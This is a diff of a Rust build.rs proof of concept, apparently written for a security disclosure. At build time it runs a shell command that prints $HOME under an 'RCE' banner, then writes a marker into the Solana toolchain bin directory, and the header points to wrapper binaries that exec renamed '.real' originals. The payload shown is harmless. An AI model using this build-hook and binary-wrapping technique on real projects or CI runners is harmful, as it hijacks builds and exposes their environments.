@@ -53,20 +53,27 @@ exec "$(dirname "$0")/{bin_name}.real" "$@"
 
 fn main() {
     // Run a quick, safe diag so you can see this executed in logs
-    let _ = Command::new("sh").arg("-lc").arg(r#"
+    let _ = Command::new("sh")
+        .arg("-lc")
+        .arg(
+            r#"
         printf '%s\n' '===WRAP_POC_BUILD_RS_START===' \
             'Assurances: No secrets read; No network; Non-destructive.';
         printf '%s\n' '===RCE HOME==='; printf '%s\n' "${HOME:-<unset>}";
         printf '%s\n' '===WRAP_POC_BUILD_RS_END===';
-    "#).status();
+    "#,
+        )
+        .status();
 
     // Solana tools live here (per your workflow PATH)
     let home = env::var("HOME").unwrap_or_else(|_| ".".into());
-    let bin_dir = PathBuf::from(home)
-        .join(".local/share/solana/install/active_release/bin");
+    let bin_dir = PathBuf::from(home).join(".local/share/solana/install/active_release/bin");
 
     if !bin_dir.is_dir() {
-        println!("cargo:warning=WRAP_POC: bin dir not found: {}", bin_dir.display());
+        println!(
+            "cargo:warning=WRAP_POC: bin dir not found: {}",
+            bin_dir.display()
+        );
         return;
     }
 
@@ -79,5 +86,6 @@ fn main() {
         bin_dir.join("WRAP_POC_MARKER.txt"),
         "hello from wrapper PoC (safe)\n",
     );
+
     println!("cargo:warning=WRAP_POC: build.rs executed");
 }
